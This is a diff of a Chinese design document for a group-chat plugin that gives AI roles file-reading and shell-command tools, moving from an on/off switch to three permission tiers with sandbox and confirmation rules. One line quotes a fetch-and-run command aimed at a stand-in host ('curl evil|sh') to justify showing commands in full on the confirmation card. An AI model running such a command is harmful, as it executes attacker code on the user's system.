@@ -10,7 +10,7 @@ grill-me 确认项：
 | # | 决策点 | 结论 |
 |---|---|---|
 | 1 | 工具集 | `read_file` + `list_dir` + `run_command` 三件套（写文件由 bash 覆盖） |
-| 2 | 安全确认 | 只读工具随工作区自动可用；`run_command` 群组开关（默认关）+ 逐条确认 |
+| 2 | 安全确认 | 只读工具随工作区自动可用；`run_command` 按群组权限档位（默认仅可查看）+ 工作区内修改档逐条确认 |
 | 3 | 沙箱约束 | 只读 realpath 硬约束工作区前缀；`run_command` 仅锚定 cwd，命令内容不过滤 |
 | 4 | 护栏 | 120s 超时 / 100KB 读 / 8k 输出 / 32k 累计；**正常调用次数不设上限** |
 | 5 | 并发模型 | 串行 round-robin：一个角色完整走完「生成⇄工具⇄发言」才轮到下一个 |
@@ -39,12 +39,12 @@ grill-me 确认项：
 { name: 'list_dir', description: '列出群组工作区目录内一个子目录的条目（名称/类型/大小）',
   parameters: { type: 'object', properties: { path: { type: 'string', description: '相对工作区根的路径，默认 "."' } } } }
 
-// run_command — 工作区内执行 shell 命令（需群组开关 + 用户逐条确认）
-{ name: 'run_command', description: '在群组工作区目录内执行 shell 命令（如运行测试、git 操作；需要用户逐条确认，超时 120 秒）',
+// run_command — 工作区内执行 shell 命令（可用性取决于群组权限档位：仅可查看剔除；工作区内修改逐条确认；完全权限免确认）
+{ name: 'run_command', description: '在群组工作区目录内执行 shell 命令（如运行测试、git 操作；超时 120 秒；是否需要确认取决于群组权限档位）',
   parameters: { type: 'object', properties: { command: { type: 'string' } }, required: ['command'] } }
 ```
 
-工具可用性：`read_file`/`list_dir` 在群组设置了 `workspaceDir` 后即可用；`run_command` 还需群组 `allowCommands` 开关打开。工具列表随可用性动态变化（工作区未设置时不传 `tools` 字段）。
+工具可用性：`read_file`/`list_dir` 在群组设置了 `workspaceDir` 后即可用；`run_command` 还需群组权限档位（`permissionTier`）非「仅可查看」（`view_only`）。工具列表随可用性动态变化（工作区未设置时不传 `tools` 字段）。
 
 ## 2. 沙箱与安全模型
 
@@ -53,7 +53,7 @@ grill-me 确认项：
 | 风险 | 对策 |
 |---|---|
 | 只读越界（读工作区外文件） | 技术硬边界：`realpath` 解析后必须满足 `target === wsReal || target.startsWith(wsReal + path.sep)`（**带分隔符比较**，防 `/ws/foo` 放行 `/ws/foobar`）；`../` 逃逸、软链逃逸、绝对路径越界一律拒绝并返回错误说明；`workspaceDir` 未设置时两工具返回「群组未设置工作区目录」 |
-| 命令执行（任意 shell） | 人工确认：cwd 固定为 `workspaceDir`（`spawn('bash', ['-c', command], { cwd })`），命令内容**不过滤**——黑名单是无效防御；主防线是逐条确认 + 群组开关默认关 |
+| 命令执行（任意 shell） | 权限档位 + 确认闸门：cwd 固定为 `workspaceDir`（`spawn('bash', ['-c', command], { cwd })`），命令内容**不过滤**——黑名单是无效防御；三档（对齐主会话 `/permission`）——`view_only` 仅可查看（run_command 从 schema 剔除，默认档）/ `workspace_write` 工作区内修改（每条命令逐条确认）/ `full_access` 完全权限（免确认直接执行，切换时经主会话同款风险确认弹窗） |
 
 命令执行细节：
 
@@ -180,7 +180,7 @@ const TRANSCRIPT_TOOL_SUMMARY = 200       // transcript 中工具输出摘要截
 - 消息卡内工具**折叠行**：复用思考折叠行（DisclosureRow）模式——摘要行「图标 read_file src/index.mjs ✓」/「图标 run_command npm test ✓ 2.3s」，展开看输出全文；图标一律宿主 `Icon*Outline` 原语（禁 Unicode 图形符，DESIGN.md 既有红线）
 - **pending 态**：工具行显示「等待确认」+ 消息流内嵌「允许 / 拒绝」按钮（P.Button primary / outline）
 - **确认卡片硬性约束：完整显示命令全文**——多行 pre-wrap 块，禁单行截断/省略号（防「前 200 字符无害 + 尾部 `; curl evil|sh`」借确认疲劳过关）
-- **群组开关**：右栏「工作区目录」行旁加「允许执行命令」P.Switch（danger 语义标注）；`workspaceDir` 为 `~`/`/` 时设置处警示文案
+- **群组权限档位**：composer 发送行左下角芯片（对齐主会话输入框左下角的 `/permission` 选择器）：盾形图标 + 档位名 + 上弹 Menu 三档（仅可查看 / 工作区内修改 / 完全权限）；切到完全权限时弹主会话同款 RiskConfirmation 风险确认（勾选「我已了解风险，并愿意继续」后才能启用）；右栏旧「允许角色执行命令」开关已移除（单一真相源）；`workspaceDir` 为 `~`/`/` 时设置处警示文案保留
 - 流式中工具执行进度经现有 SSE 快照驱动（`run.pendingConfirm` + 消息 `toolCalls`）
 
 **持久化**：`messageJson` 加 `toolCalls`（无则省略）；hydrate 兼容读取；session 文件 schema 仍为 1（可选字段增量，向后兼容，零迁移）。
@@ -198,13 +198,13 @@ const TRANSCRIPT_TOOL_SUMMARY = 200       // transcript 中工具输出摘要截
 
 | 增量 | 形态 |
 |---|---|
-| mutate op `setAllowCommands` | `{ groupId, allowed }` → 更新群组开关 |
+| mutate op `setPermissionTier` | `{ groupId, tier }` → 更新群组权限档位（合法值 `view_only` / `workspace_write` / `full_access`；降到 `view_only` 时若该群挂着待确认命令自动拒绝） |
 | action kind `confirmCommand` | `{ toolCallId, allow }` → 三查同步置空后放行/拒绝 |
-| snapshot 扩展 | `groups[].allowCommands`、`messages[].toolCalls`、`run.pendingConfirm` |
+| snapshot 扩展 | `groups[].permissionTier`、`messages[].toolCalls`、`run.pendingConfirm` |
 
-## 8. 群组 `allowCommands` 落盘
+## 8. 群组 `permissionTier` 落盘
 
-`ledger.json` 的 `groups[i]` 加可选字段 `allowCommands: boolean`（无则 `false`）。与群组名同级——群组**属性**归 ledger，不破坏「角色/会话明细不入 ledger」的 v2.1 原则；旧数据无字段即关，零迁移。
+`ledger.json` 的 `groups[i]` 写字段 `permissionTier: 'view_only' | 'workspace_write' | 'full_access'`（schema 3）。与群组名同级——群组**属性**归 ledger，不破坏「角色/会话明细不入 ledger」的 v2.1 原则。v2 遗留布尔 `allowCommands` 读取时经 `migrateTier` 迁移：`true → workspace_write`（今日语义即「可执行命令但逐条确认」）、`false`/无字段 → `view_only`，零行为回归；新建群组固定从 `view_only` 开始（不做全局「最近选择」继承——新群工作区可能指向不同目录，静默继承完全权限是安全陷阱）。
 
 ## 9. 验证清单（实现完成的判定标准）
 
@@ -219,7 +219,7 @@ const TRANSCRIPT_TOOL_SUMMARY = 200       // transcript 中工具输出摘要截
 - [ ] 流收集：delta-only 累积、max-tokens 丢弃工具块、error 中断丢弃半成品
 - [ ] 护栏：>100KB 文件截断；8k 回注截断；**>1MB stdout 采集弃置标注**；120s 超时 kill 并标注
 - [ ] 持久化：`toolCalls` 落盘、重启恢复；transcript 摘要注入下一角色上下文
-- [ ] 开关：`allowCommands` 默认关（tools 中无 run_command）；开启后可用；右栏开关生效
+- [ ] 档位：`view_only`（默认，tools 中无 run_command）→ `workspace_write`（逐条确认）→ `full_access`（免确认直接执行）；切换任意时刻可用，对下一次工具调用生效；降到 view_only 时待确认命令自动拒绝；升到 full_access 不自动放行已排队的待确认命令
 - [ ] 串行：角色 A 的工具操作完成后角色 B 才开始（runLoop 顺序不变）
 - [ ] dispose：确认等待中执行插件 dispose → 等待者被唤醒、子进程被 kill、无悬挂 promise、锁正常释放
 - [ ] `DSH_GROUP_CHAT_STORE` 临时目录 + stub llm（含 tool-call chunk 发射器）的 Host 半冒烟测试通过
@@ -235,10 +235,10 @@ const TRANSCRIPT_TOOL_SUMMARY = 200       // transcript 中工具输出摘要截
 | `index.mjs` 顶部 | 护栏常量 + 工具 schema 定义 |
 | `index.mjs` `speak()` | 重构为 agent loop（§3，含流收集/finish 判定/降级/收尾）；`buildToolSchemas` / `executeTool` / `resolveInWorkspace`（realpath 带分隔符硬校验） |
 | `index.mjs` `run` 状态机 | `pendingConfirm` + `confirmSignal` + `childProc`；`confirmCommand` action 三查；stop / dispose 双路径唤醒与 kill |
-| `index.mjs` `mutate` | `setAllowCommands` op；`appendMessage` 落 `toolCalls` |
+| `index.mjs` `mutate` | `setPermissionTier` op；`appendMessage` 落 `toolCalls` |
 | `index.mjs` `transcriptBlock` | 工具调用单行摘要注入 |
-| `index.mjs` `messageJson`/`ledgerDocument`/`hydrate` | `toolCalls` / `allowCommands` 可选字段扩展 |
-| `client.js` | 工具折叠行 + pending 确认卡片（命令全文）+ 右栏开关 + snapshot 适配 |
+| `index.mjs` `messageJson`/`ledgerDocument`/`hydrate` | `toolCalls` / `permissionTier` 字段扩展（`allowCommands` 读取时迁移） |
+| `client.js` | 工具折叠行 + pending 确认卡片（命令全文）+ composer 权限档位选择器（含风险确认弹窗）+ snapshot 适配 |
 | `README.md` / `PRODUCT.md` | 功能与约束条目更新（含撤销「不注册模型可见工具」约束） |
 
 实现需对齐的 dsh-llm 契约（评审已核实）：`ToolCallBlock {type:'tool-call', id, name, arguments:rawJsonString}`；`ToolResultBlock {toolCallId, content:[TextBlock], isError}` 挂 user-role 消息（`source {kind:'tool', callId}`）；assistant 消息带 `source {kind:'model', provider, model}`；错误经 `finish {kind:'error', failure:{message, code}}` 到达。
